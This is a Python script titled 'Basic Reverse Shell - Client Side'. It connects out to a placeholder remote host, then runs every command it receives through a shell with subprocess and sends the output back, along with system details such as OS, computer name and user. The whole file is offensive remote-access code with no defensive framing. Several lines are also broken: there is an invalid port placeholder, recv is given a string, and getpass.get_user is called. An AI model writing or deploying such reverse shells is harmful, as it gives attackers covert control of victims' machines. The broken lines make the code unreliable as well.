# Basic Reverse Shell - Client Side #
import os
import socket
import subprocess
import platform
from getpass import getuser, getpass


FORMAT = "utf-8"
get_user = getuser()
host = "client ip"
port = (client port)
s = socket.socket()


# Create A Socket
def socket_create():
    try:
        global host
        global port
        global s
        host = "client ip"
        port = (client port)
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect To A Remote Socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket Connection Error: " + str(msg))


# Execute Commands
def shell():
    global s
    global data
    global output_str
    while True:
        data = s.recv(FORMAT)
        if data == "exit":
            exit()
        elif data[:2].decode(FORMAT) == 'cd':
            os.chdir(data[3:].decode(FORMAT))
            # Get system info
        elif data == "sysinfo":
            sysinfo = f"""
            Operating System: {platform.system()}
            Computer Name: {platform.node()}
            Username: {getpass.get_user}
            Release Version: {platform.release()}
            Processor Architecture: {platform.processor()}
                        """
            s.send(sysinfo.encode())
            print(sysinfo)

        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, FORMAT)
            s.send(str.encode(output_str + str(os.getcwd()) + ": "))
            print(output_str)


def main():
    socket_create()
    socket_connect()
    shell()


main()
